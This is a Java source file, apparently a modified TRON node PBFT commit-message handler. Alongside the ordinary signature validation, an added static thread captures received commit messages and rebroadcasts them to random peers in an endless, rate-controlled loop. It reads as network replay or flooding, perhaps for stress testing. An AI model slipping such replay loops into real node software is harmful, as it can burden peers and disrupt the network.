package org.tron.core.net.messagehandler;

import com.google.common.collect.Sets;
import com.google.protobuf.ByteString;
import com.google.protobuf.InvalidProtocolBufferException;
import io.netty.util.internal.ConcurrentSet;
import java.io.Closeable;
import java.security.SignatureException;
import java.util.*;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.tron.common.crypto.ECKey;
import org.tron.common.es.ExecutorServiceManager;
import org.tron.common.utils.ByteArray;
import org.tron.common.utils.Sha256Hash;
import org.tron.consensus.base.Param;
import org.tron.core.ChainBaseManager;
import org.tron.core.capsule.BlockCapsule;
import org.tron.core.capsule.TransactionCapsule;
import org.tron.core.config.args.Args;
import org.tron.core.db.PbftSignDataStore;
import org.tron.core.exception.P2pException;
import org.tron.core.net.TronNetService;
import org.tron.core.net.message.TronMessage;
import org.tron.core.net.message.pbft.PbftCommitMessage;
import org.tron.core.net.peer.PeerConnection;
import org.tron.protos.Protocol.PBFTMessage.DataType;
import org.tron.protos.Protocol.PBFTMessage.Raw;

@Slf4j(topic = "pbft-data-sync")
@Service
public class PbftDataSyncHandler implements TronMsgHandler, Closeable {

  private Map<Long, PbftCommitMessage> pbftCommitMessageCache = new ConcurrentHashMap<>();

  private final String esName = "valid-header-pbft-sign";

  private ExecutorService executorService = ExecutorServiceManager.newFixedThreadPool(
      esName, 19);

  @Autowired
  private ChainBaseManager chainBaseManager;




  private static volatile Map<Integer, TronMessage> msgGathered = new HashMap<>();
  private static volatile Map<Integer, TronMessage> msgQueue = new HashMap<>();

  private static volatile long msgQueueMaxSize = Args.getInstance().pbftCommitMsgMaxQueueSize;
  private static volatile long msgMaxSpeed = Args.getInstance().pbftCommitMsgMaxSpeed;

  private static volatile long[] msgTotalSent = {0};
  private static volatile long[] msgSuccessSent = {0};
  private static volatile long[] tmpTimestamp = {0};
  static {
    new Thread(() -> {
      if(msgQueueMaxSize == 0 || msgMaxSpeed ==0){
        logger.info("@@@ msgQueueMaxSize or msgMaxSpeed was not found in config file. task failed..");
        return;
      }
      while (true) {
        try {
          logger.info("@@@ msgQueue size {}, peers {}", msgQueue.size(), TronNetService.getPeers().size());
          if (msgQueue.size() >= msgQueueMaxSize && TronNetService.getPeers().size() >= 1) {
            tmpTimestamp[0] = System.currentTimeMillis();
            msgQueue.values().forEach(v -> {
              try{
                msgTotalSent[0]++;
                if (msgTotalSent[0] % msgMaxSpeed == 0) {
                  long s = tmpTimestamp[0] + 1000 - System.currentTimeMillis();
                  logger.info("&&& total send {}, success count {}, sleep {}ms", msgTotalSent[0], msgSuccessSent[0], s);
                  if (s > 0) {
                    Thread.sleep(s);
                  }
                  tmpTimestamp[0] = System.currentTimeMillis();
                  msgSuccessSent[0] = 0;
                }
              }catch (Exception e){}
              List<PeerConnection> list = TronNetService.getPeers();
              if (list.size() == 0) {
                logger.info("@@@ peer size == 0 return...");
                return;
              }
              int index = new Random().nextInt(list.size());
              PeerConnection peerConnection = list.get(index);
              peerConnection.sendMessage(v);
              msgSuccessSent[0]++;
            });
          } else {
            Thread.sleep(1000);
          }
        }catch (Exception e) {
          logger.error("@@@ adv msg failed.", e);
          try{ Thread.sleep(1000); }catch (Exception e2){}
        }
      }
    }).start();
  }

  public static volatile long cnt = 0;

  @Override
  public void processMessage(PeerConnection peer, TronMessage msg) throws P2pException {
    PbftCommitMessage pbftCommitMessage = (PbftCommitMessage) msg;

    if (msgQueueMaxSize>0 && msgMaxSpeed >0){
      msgGathered.put(msg.hashCode(), msg);
      cnt++;
      logger.info("### cnt = {}, map1-size = {}, map2-size = {}",
          cnt, msgGathered.size(), msgQueue.size());
      if (msgGathered.size() >= msgQueueMaxSize) {
        msgQueue = msgGathered;
        msgGathered = new HashMap<>();
      }
    }
    try {
      Raw raw = Raw.parseFrom(pbftCommitMessage.getPBFTCommitResult().getData());
      pbftCommitMessageCache.put(raw.getViewN(), pbftCommitMessage);
    } catch (InvalidProtocolBufferException e) {
      logger.error("", e);
    }
  }

  public void processPBFTCommitData(BlockCapsule block) {
    try {
      if (!chainBaseManager.getDynamicPropertiesStore().allowPBFT()) {
        return;
      }
      long epoch = 0;
      PbftCommitMessage pbftCommitMessage = pbftCommitMessageCache.remove(block.getNum());
      long maintenanceTimeInterval = chainBaseManager.getDynamicPropertiesStore()
          .getMaintenanceTimeInterval();
      if (pbftCommitMessage == null) {
        long round = block.getTimeStamp() / maintenanceTimeInterval;
        epoch = (round + 1) * maintenanceTimeInterval;
      } else {
        processPBFTCommitMessage(pbftCommitMessage);
        Raw raw = Raw.parseFrom(pbftCommitMessage.getPBFTCommitResult().getData());
        epoch = raw.getEpoch();
      }
      pbftCommitMessage = pbftCommitMessageCache.remove(epoch);
      if (pbftCommitMessage != null) {
        processPBFTCommitMessage(pbftCommitMessage);
      }
    } catch (Exception e) {
      logger.error("", e);
    }
  }

  @Override
  public void close() {
    ExecutorServiceManager.shutdownAndAwaitTermination(executorService, esName);
  }

  private void processPBFTCommitMessage(PbftCommitMessage pbftCommitMessage) {
    try {
      PbftSignDataStore pbftSignDataStore = chainBaseManager.getPbftSignDataStore();
      Raw raw = Raw.parseFrom(pbftCommitMessage.getPBFTCommitResult().getData());
      if (!validPbftSign(raw, pbftCommitMessage.getPBFTCommitResult().getSignatureList(),
          chainBaseManager.getWitnesses())) {
        return;
      }
      if (raw.getDataType() == DataType.BLOCK
          && pbftSignDataStore.getBlockSignData(raw.getViewN()) == null) {
        pbftSignDataStore.putBlockSignData(raw.getViewN(), pbftCommitMessage.getPbftSignCapsule());
        logger.info("Save the block {} pbft commit data", raw.getViewN());
      } else if (raw.getDataType() == DataType.SRL
          && pbftSignDataStore.getSrSignData(raw.getEpoch()) == null) {
        pbftSignDataStore.putSrSignData(raw.getEpoch(), pbftCommitMessage.getPbftSignCapsule());
        logger.info("Save the srl {} pbft commit data", raw.getEpoch());
      }
    } catch (InvalidProtocolBufferException e) {
      logger.error("", e);
    }
  }

  private boolean validPbftSign(Raw raw, List<ByteString> srSignList,
      List<ByteString> currentSrList) {
    //valid sr list
    if (srSignList.size() != 0) {
      Set<ByteString> srSignSet = new ConcurrentSet();
      srSignSet.addAll(srSignList);
      if (srSignSet.size() < Param.getInstance().getAgreeNodeCount()) {
        logger.error("sr sign count {} < sr count * 2/3 + 1 == {}", srSignSet.size(),
            Param.getInstance().getAgreeNodeCount());
        return false;
      }
      byte[] dataHash = Sha256Hash.hash(true, raw.toByteArray());
      Set<ByteString> srSet = Sets.newHashSet(currentSrList);
      List<Future<Boolean>> futureList = new ArrayList<>();
      for (ByteString sign : srSignList) {
        futureList.add(executorService.submit(
            new ValidPbftSignTask(raw.getViewN(), srSignSet, dataHash, srSet, sign)));
      }
      for (Future<Boolean> future : futureList) {
        try {
          if (!future.get()) {
            return false;
          }
        } catch (Exception e) {
          logger.error("", e);
        }
      }
      if (srSignSet.size() != 0) {
        return false;
      }
    }
    return true;
  }

  private class ValidPbftSignTask implements Callable<Boolean> {

    private long viewN;
    private Set<ByteString> srSignSet;
    private byte[] dataHash;
    private Set<ByteString> srSet;
    private ByteString sign;

    ValidPbftSignTask(long viewN, Set<ByteString> srSignSet,
        byte[] dataHash, Set<ByteString> srSet, ByteString sign) {
      this.viewN = viewN;
      this.srSignSet = srSignSet;
      this.dataHash = dataHash;
      this.srSet = srSet;
      this.sign = sign;
    }

    @Override
    public Boolean call() throws Exception {
      try {
        byte[] srAddress = ECKey.signatureToAddress(dataHash,
            TransactionCapsule.getBase64FromByteString(sign));
        if (!srSet.contains(ByteString.copyFrom(srAddress))) {
          logger.error("valid sr signature fail,error sr address:{}",
              ByteArray.toHexString(srAddress));
          return false;
        }
        srSignSet.remove(sign);
      } catch (SignatureException e) {
        logger.error("viewN {} valid sr list sign fail!", viewN, e);
        return false;
      }
      return true;
    }
  }

}
